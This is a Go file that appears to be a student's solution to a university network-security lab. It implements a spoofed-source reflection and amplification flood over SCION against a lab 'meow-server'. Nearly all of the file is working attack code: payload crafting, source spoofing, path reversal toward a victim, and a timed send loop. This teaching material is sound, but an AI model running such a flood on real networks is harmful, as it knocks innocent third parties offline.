package client

import (
	// All of these imports were used for the mastersolution
	// "encoding/json"

	"fmt"
	"log"

	"net"
	// "sync" // TODO uncomment any imports you need (go optimizes away unused imports)
	"context"
	"time"

	"ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/sock/reliable"

	//"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	// "github.com/scionproto/scion/go/lib/sock/reliable"
)

func GenerateAttackPayload() []byte {
	// TODO: Amplification Task
	//return make([]byte, 0)

	request := server.NewRequest("67534", false, true, true, true)
	server.SetID(1)(request)

	req, err := request.MarshalJSON()
	if err != nil {
		log.Fatal(err)
		return make([]byte, 0)
	}

	return req
}

func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	serverAddr, err := snet.ParseUDPAddr(meowServerAddr)
	if err != nil {
		log.Fatal(err)
	}

	serverIA := serverAddr.IA
	spoofedIA := spoofedAddr.IA

	fmt.Println(serverAddr.Host.IP.To16().String())
	fmt.Println(spoofedAddr.Host.IP.To16().String())

	dispatchPort := 0
	n, err := fmt.Sscan(clientConstants.DispatcherPort, &dispatchPort)
	_ = n
	fmt.Printf("Dispatcher port: %d\n", dispatchPort)
	serverAddr.NextHop = &net.UDPAddr{
		IP:   serverAddr.Host.IP,
		Port: dispatchPort,
		Zone: "",
	}

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// ----------------------------

	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	// SCION daemon

	sciondAddress := SCIONDAddress()

	sciondConn, err := daemon.NewService(sciondAddress).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}

	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.

	allPaths, err := daemon.Querier{Connector: sciondConn, IA: serverIA}.Query(context.Background(), spoofedIA)

	originalPath := allPaths[0].Path()
	originalPath.Reverse()
	serverAddr.Path = originalPath

	hops := allPaths[0].Metadata().InternalHops
	fmt.Println(hops)

	scionNetwork := snet.NewNetwork(spoofedIA, dispatcher, daemon.RevHandler{Connector: sciondConn})
	conn, err := scionNetwork.Dial(context.Background(), "udp", spoofedAddr.Host, serverAddr, addr.SvcNone)
	defer conn.Close()

	//fmt.Println(net.UDPAddr{IP: serverAddr.Host.IP, Port: dispatchPort}.IP.To16().String())
	//conn.WriteTo(payload, &net.UDPAddr{IP: serverAddr.Host.IP, Port: dispatchPort})

	attackDuration := AttackDuration()
	for start := time.Now(); time.Since(start) < attackDuration; {
		conn.Write(payload)
	}
	return nil
}
